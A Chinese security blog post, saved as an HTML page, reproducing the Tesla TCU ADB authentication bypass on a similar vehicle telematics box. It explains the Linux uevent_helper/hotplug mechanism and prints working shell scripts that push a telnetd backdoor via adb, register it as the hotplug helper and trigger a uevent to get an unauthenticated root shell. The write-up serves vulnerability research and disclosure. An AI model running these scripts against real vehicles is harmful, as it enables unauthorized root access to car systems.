@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="车联网安全实践之Tesla TCU ADB 认证绕过“复现”在准备今年的“车联网安全年度大事件汇总”，发现遗漏一些事件，其中就包括“Tesla TCU ADB 认证绕过”。Technical Advisory: Tesla Telematics Control Unit - ADB Auth Bypass 刚发布的时间简单看了一下，没有验证过。虽然之前也有绕过（文件覆盖、算法逆向）不少TBOX 的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="车联网安全实践之Tesla TCU ADB 认证绕过“复现”">
+<meta property="og:url" content="http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/index.html">
+<meta property="og:site_name" content="Delikely&#39;s Blog">
+<meta property="og:description" content="车联网安全实践之Tesla TCU ADB 认证绕过“复现”在准备今年的“车联网安全年度大事件汇总”，发现遗漏一些事件，其中就包括“Tesla TCU ADB 认证绕过”。Technical Advisory: Tesla Telematics Control Unit - ADB Auth Bypass 刚发布的时间简单看了一下，没有验证过。虽然之前也有绕过（文件覆盖、算法逆向）不少TBOX 的">
+<meta property="og:locale">
+<meta property="og:image" content="http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/image-20251227132010489.png">
+<meta property="og:image" content="http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/image-20251227132036099.png">
+<meta property="og:image" content="http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/image-20251227144647467.png">
+<meta property="og:image" content="http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/image-20251227210816388.png">
+<meta property="og:image" content="http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/image-20251227204551957.png">
+<meta property="og:image" content="http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/image-20251227212847775.png">
+<meta property="article:published_time" content="2025-12-27T15:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-27T16:24:54.314Z">
+<meta property="article:author" content="Delikely">
+<meta property="article:tag" content="Automotive">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/image-20251227132010489.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/rice.svg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/rice.svg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/rice.png">
+          
+        
+    
+    <!-- title -->
+    <title>车联网安全实践之Tesla TCU ADB 认证绕过“复现”</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Delikely's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body class="max-width mx-auto px3">
+    
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/2018/04/11/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2099/01/01/genius-vulns/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2025/06/17/GB-T45496-Calculator/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&text=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&title=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&is_video=false&description=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=车联网安全实践之Tesla TCU ADB 认证绕过“复现”&body=Check out this article: http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&title=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&title=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&title=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&title=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&name=车联网安全实践之Tesla TCU ADB 认证绕过“复现”&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&text=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5%E4%B9%8BTesla-TCU-ADB-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E2%80%9C%E5%A4%8D%E7%8E%B0%E2%80%9D"><span class="toc-number">1.</span> <span class="toc-text">车联网安全实践之Tesla TCU ADB 认证绕过“复现”</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8A%B6%E6%80%81%E9%AA%8C%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">状态验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8E%9F%E8%84%9A%E6%9C%AC%E5%A4%8D%E7%8E%B0%EF%BC%8C%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">使用原脚本复现，失败</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">异常分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E5%A4%8D%E7%8E%B0%EF%BC%8C%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96%E5%88%B0-root-shell"><span class="toc-number">1.3.3.</span> <span class="toc-text">再次复现，成功获取到 root shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9A-%E6%8F%92%E6%8B%94USB-%E8%A7%A6%E5%8F%91"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">方式一： 插拔USB 触发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9A-%E4%BF%AE%E6%94%B9-uevent-%E6%96%87%E4%BB%B6%E8%A7%A6%E5%8F%91"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">方式二： 修改 uevent 文件触发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9"><span class="toc-number">1.4.</span> <span class="toc-text">需要注意的点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        车联网安全实践之Tesla TCU ADB 认证绕过“复现”
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Delikely's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2025-12-27T15:00:00.000Z" itemprop="datePublished">2025-12-27</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Automotive/" rel="tag">Automotive</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="车联网安全实践之Tesla-TCU-ADB-认证绕过“复现”"><a href="#车联网安全实践之Tesla-TCU-ADB-认证绕过“复现”" class="headerlink" title="车联网安全实践之Tesla TCU ADB 认证绕过“复现”"></a>车联网安全实践之Tesla TCU ADB 认证绕过“复现”</h2><p>在准备今年的“车联网安全年度大事件汇总”，发现遗漏一些事件，其中就包括“Tesla TCU ADB 认证绕过”。<a target="_blank" rel="noopener" href="https://www.nccgroup.com/research-blog/technical-advisory-tesla-telematics-control-unit-adb-auth-bypass/">Technical Advisory: Tesla Telematics Control Unit - ADB Auth Bypass</a> 刚发布的时间简单看了一下，没有验证过。虽然之前也有绕过（文件覆盖、算法逆向）不少TBOX 的 ADB SHELL 访问控制，但是使用USB热插拔实现任意代码执行的却还是第一次见。手头没有Tesla 的TCU，但是刚好有其他相似情况的其他车的TBOX。趁着这个机会动手试试。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在TCU/TBOX中，禁用或限制了 adb shell，但允许 adb push/pull。 adb pull/push 用于上传和下载文件。一般直接覆盖掉自启文件加入后门就能拿到 shell，但很多TBOX中大部分分区挂载为只读，覆盖文件获取shell就比较麻烦了。需要找到可写的文件，但不一定有。滥用 uevent_helper/hotplug sysfs kernel subsystems 执行任意命令,开启 telnet 服务,获取 root shell。在 <code>/sys/kernel/uevent_helper</code>、<code>/proc/sys/kernel/hotplug</code> 写入 shell 脚本的路径，触发 uevent 事件，将自动调用 shell 脚本执行。</p>
+<h3 id="状态验证"><a href="#状态验证" class="headerlink" title="状态验证"></a>状态验证</h3><p>连接TBOX 的 Mirco-USB后，识别到了 ADB 设备，进入 adb shell 需要输入密码。 </p>
+<p><img src="image-20251227132010489.png" alt="image-20251227132010489" style="zoom: 70%;" /></p>
+<p>和 TESLA TCU 一样，adb pull/push 依然能够在未授权的状态下使用。</p>
+<p><img src="image-20251227132036099.png" alt="image-20251227132036099" style="zoom:80%;" /></p>
+<p>可以看出，虽然ECU不同，但是有相同的表现。可以利用相同的利用方法获取 shell。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="使用原脚本复现，失败"><a href="#使用原脚本复现，失败" class="headerlink" title="使用原脚本复现，失败"></a>使用原脚本复现，失败</h4><ol>
+<li><p>在 TBOX 上开启 telnet 的脚本 telnetd.sh</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">touch /tmp/executed</span><br><span class="line">telnetd -l /bin/bash -p 2727                                                                              </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>准备利用脚本 exploit.sh</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chmod +x telnetd.sh</span><br><span class="line">adb push telnetd.sh /tmp/telnetd.sh</span><br><span class="line"><span class="comment"># Write &quot;/tmp/telnetd.sh&quot; to uevent_helper and hotplug</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/tmp/telnetd.sh&#x27;</span> &gt; t2.sh</span><br><span class="line">adb push t2.sh /sys/kernel/uevent_helper</span><br><span class="line">adb push t2.sh /proc/sys/kernel/hotplug</span><br><span class="line"><span class="comment"># Trigger a uevent just by doing a file system read</span></span><br><span class="line">adb pull /etc/passwd</span><br><span class="line"><span class="comment"># Setup the TCP port forward for port 2727</span></span><br><span class="line">adb forward tcp:2727 tcp:2727</span><br><span class="line"><span class="comment"># Wait for telnetd to run</span></span><br><span class="line">sleep 3</span><br><span class="line"><span class="comment"># Connect to the telnet shell</span></span><br><span class="line">telnet 127.0.0.1 2727  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>exploit</p>
+<p>直接运行，利用失败。</p>
+<p><img src="image-20251227144647467.png" alt="image-20251227144647467"></p>
+</li>
+</ol>
+<h4 id="异常分析"><a href="#异常分析" class="headerlink" title="异常分析"></a>异常分析</h4><p>  检查发现，文件都写入成功了。</p>
+   <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /sys/kernel/uevent_helper</span></span><br><span class="line">/tmp/telnetd.sh</span><br><span class="line">/ <span class="comment"># cat /proc/sys/kernel/hotplug</span></span><br><span class="line">/tmp/telnetd.sh</span><br><span class="line">/ <span class="comment"># ls -al /tmp/telnetd.sh </span></span><br><span class="line">-rwxrwxrwx    1 root     root            58 Dec 27  2025 /tmp/telnetd.sh</span><br><span class="line">/ <span class="comment"># cat /sys/kernel/uevent_helper</span></span><br><span class="line">/tmp/telnetd.sh</span><br><span class="line">/ <span class="comment"># cat /proc/sys/kernel/hotplug</span></span><br><span class="line">/tmp/telnetd.sh</span><br></pre></td></tr></table></figure>
+<p>   唯一的问题是，没有触发成功。Tesla TCU 采用读取文件方式触发——<code>Trigger a uevent just by doing a file system read</code>。</p>
+<p>   现在来展开分析一下利用脚本。</p>
+<ul>
+<li><p><strong><code>/sys/kernel/uevent_helper</code></strong> 是一个 <strong>sysfs 虚拟文件</strong>，用于配置 Linux 内核的 <em>uevent helper</em> 程序路径。该机制属于早期的用户态事件处理方式：当内核检测到设备相关事件（如设备添加、移除、状态变化等 uevent）时，会直接执行该路径所指定的用户空间程序，并通过环境变量传递事件信息，以完成相应的用户态处理逻辑。</p>
+</li>
+<li><p><strong><code>/proc/sys/kernel/hotplug</code></strong>是一个 <strong>procfs 虚拟文件</strong>，用于指定内核的 <em>hotplug helper</em> 程序路径。在设备配置发生变化（例如 USB 设备插入或移除）时，内核会调用该用户空间程序以执行相应的热插拔处理操作。</p>
+<p>Linux 内核 <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/drivers/base/Kconfig#L7">Kconfig</a> 中对UEVENT_HELPER的定义。</p>
+<blockquote>
+<p>config UEVENT_HELPER</p>
+<pre><code>bool &quot;Support for uevent helper&quot;
+help
+  The uevent helper program is forked by the kernel for
+  every uevent.
+  Before the switch to the netlink-based uevent source, this was
+  used to hook hotplug scripts into kernel device events. It
+  usually pointed to a shell script at /sbin/hotplug.
+  This should not be used today, because usual systems create
+  many events at bootup or device discovery in a very short time
+  frame. One forked process per event can create so many processes
+  that it creates a high system load, or on smaller systems
+  it is known to create out-of-memory situations during bootup.
+</code></pre><p>config UEVENT_HELPER_PATH</p>
+<pre><code>string &quot;path to uevent helper&quot;
+depends on UEVENT_HELPER
+default &quot;&quot;
+help
+  To disable user space helper program execution at by default
+  specify an empty string here. This setting can still be altered
+  via /proc/sys/kernel/hotplug or via /sys/kernel/uevent_helper
+  later at runtime.
+</code></pre></blockquote>
+</li>
+</ul>
+<p><code>UEVENT_HELPER</code> 是 Linux 内核中用于在 uevent 发生时内核直接 fork 执行用户空间程序。该机制因严重的性能和稳定性问题已被弃用，并由 netlink-based uevent（udev/ueventd）取代默认配置通常将其禁用（不少嵌入式Linux仍支持），但在运行时可通过 <code>/sys/kernel/uevent_helper</code> 或 <code>/proc/sys/kernel/hotplug</code> 启用。</p>
+<p>Uevent是Linux内核设备模型中的一个机制，属于Kobject子系统，用于在Kobject状态发生变化时（如添加、移除、上线、下线或更改）向用户空间发送事件通知。‌‌<strong>Uevent的核心功能是支持热插拔设备管理</strong>‌，例如当U盘插入时，内核驱动会动态创建设备结构并触发uevent，通知用户空间程序自动创建/dev设备节点或挂载设备。‌</p>
+<p>搞清原理后，需要想办法触发 uevent 事件。触发 uevent 事件可以通过以下两种方法。</p>
+<ol>
+<li><p>重新插拔USB 线</p>
+</li>
+<li><p>手动触发, 写 <code>uevent</code> 文件。如 <code>echo add &gt; /sys/class/net/lo/uevent</code>。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> add    &gt; /sys/class/&lt;subsystem&gt;/&lt;device&gt;/uevent</span><br><span class="line"><span class="built_in">echo</span> remove &gt; /sys/class/&lt;subsystem&gt;/&lt;device&gt;/uevent</span><br><span class="line"><span class="built_in">echo</span> change &gt; /sys/class/&lt;subsystem&gt;/&lt;device&gt;/uevent</span><br></pre></td></tr></table></figure>
+<p><img src="image-20251227210816388.png" alt="image-20251227210816388"></p>
+</li>
+</ol>
+<p>​        原文给出的读取文件<code>adb pull /etc/passwd</code>，无法触发。uevent 只能由 <strong>内核设备事件或 sysfs uevent 写入</strong> 触发。出清楚为什么 <a target="_blank" rel="noopener" href="https://www.nccgroup.com/research-blog/?author=18217#hub">Alex Plaskett</a>, <a target="_blank" rel="noopener" href="https://www.nccgroup.com/research-blog/?author=18273#hub">McCaulay Hudson</a> 为什么触发成功。</p>
+<h4 id="再次复现，成功获取到-root-shell"><a href="#再次复现，成功获取到-root-shell" class="headerlink" title="再次复现，成功获取到 root shell"></a>再次复现，成功获取到 root shell</h4><p>利用<strong>USB插拔</strong>和<strong>修改uevenet文件</strong>两种方式触发uevenet事件，执行 telnetd.sh, 获取 shell。</p>
+<h5 id="方式一：-插拔USB-触发"><a href="#方式一：-插拔USB-触发" class="headerlink" title="方式一： 插拔USB 触发"></a>方式一： 插拔USB 触发</h5><p>在 telnetd.sh 中，将 /bin/bash 修改为 /bin/sh；把 exploit.sh 拆分成了2部分。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat telnetd.sh</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">touch /tmp/executed</span><br><span class="line">telnetd -l /bin/sh -p 2727</span><br><span class="line">                                                                                                                      </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat exploit.sh </span></span><br><span class="line"><span class="comment"># Upload telnet script to TCU</span></span><br><span class="line">chmod +x telnetd.sh</span><br><span class="line">adb push telnetd.sh /tmp/telnetd.sh</span><br><span class="line"><span class="comment"># Write &quot;/tmp/telnetd.sh&quot; to uevent_helper and hotplug</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/tmp/telnetd.sh&#x27;</span> &gt; t2.sh</span><br><span class="line"><span class="comment">#adb push t2.sh /sys/kernel/uevent_helper</span></span><br><span class="line">adb push t2.sh /proc/sys/kernel/hotplug</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;plug out and plug in USB cable&quot;</span> </span><br><span class="line">                                                                                                                      </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat connect.sh </span></span><br><span class="line"><span class="comment"># Setup the TCP port forward for port 2727</span></span><br><span class="line">adb forward tcp:2727 tcp:2727</span><br><span class="line"><span class="comment"># Connect to the telnet shell</span></span><br><span class="line">telnet 127.0.0.1 2727</span><br></pre></td></tr></table></figure>
+<p>执行 exploit.sh 后，插拔 USB，链接 telnet 获取到 root shell。</p>
+<p><img src="image-20251227204551957.png" alt="image-20251227204551957" style="zoom:80%;" /></p>
+<h5 id="方式二：-修改-uevent-文件触发"><a href="#方式二：-修改-uevent-文件触发" class="headerlink" title="方式二： 修改 uevent 文件触发"></a>方式二： 修改 uevent 文件触发</h5><p>在 telnetd.sh 中，将 /bin/bash 修改为 /bin/sh ；把 exploit.sh 中触发uevent脚本修改为<code>echo add &gt; /sys/class/net/lo/uevent</code>。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat telnetd.sh</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">touch /tmp/executed</span><br><span class="line">telnetd -l /bin/sh -p 2727</span><br><span class="line">                                                                                                                      </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat exploit.sh</span></span><br><span class="line"><span class="comment"># Upload telnet script to TCU</span></span><br><span class="line">chmod +x telnetd.sh</span><br><span class="line">adb push telnetd.sh /tmp/telnetd.sh</span><br><span class="line"><span class="comment"># Write &quot;/tmp/telnetd.sh&quot; to uevent_helper and hotplug</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/tmp/telnetd.sh&#x27;</span> &gt; t2.sh</span><br><span class="line">adb push t2.sh /sys/kernel/uevent_helper</span><br><span class="line">adb push t2.sh /proc/sys/kernel/hotplug</span><br><span class="line"><span class="comment"># Trigger a uevent just by write to uevent file</span></span><br><span class="line"><span class="built_in">echo</span> add &gt; /sys/class/net/lo/uevent</span><br><span class="line">sleep 3</span><br><span class="line"><span class="comment"># Setup the TCP port forward for port 2727</span></span><br><span class="line">adb forward tcp:2727 tcp:2727</span><br><span class="line"><span class="comment"># Connect to the telnet shell</span></span><br><span class="line">telnet 127.0.0.1 2727</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>执行脚本后，成功获取到 root shell。</p>
+<p><img src="image-20251227212847775.png" alt="image-20251227212847775" style="zoom:80%;" /></p>
+<h3 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h3><ol>
+<li><p>执行的前提是adb的权限是 root。如果是其他用户,写入文件<code>/proc/sys/kernel/hotplug</code>、<code>/sys/kernel/uevent_helper</code>会失败。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># ls -la /proc/sys/kernel/hotplug</span></span><br><span class="line">-rw-r--r--    1 root     root          0 Dec 27  2025 /proc/sys/kernel/hotplug</span><br><span class="line">/ <span class="comment"># ls -la /sys/kernel/uevent_helper</span></span><br><span class="line">-rw-r--r--    1 root     root          0 Dec 27  2025 /sys/kernel/uevent_helper</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>直接用原有的 telnetd.sh 可能会失败，有些TBOX中没有 /bin/bash,可以用 /bin/sh 代替。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">touch /tmp/executed</span><br><span class="line">telnetd -l /bin/sh -p 2727</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.nccgroup.com/research-blog/technical-advisory-tesla-telematics-control-unit-adb-auth-bypass/">Technical Advisory: Tesla Telematics Control Unit - ADB Auth Bypass | NCC Group</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.bofh.it/debian/id_413">Evading from linux containers</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-34251">NVD - CVE-2025-34251</a></p>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/2018/04/11/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
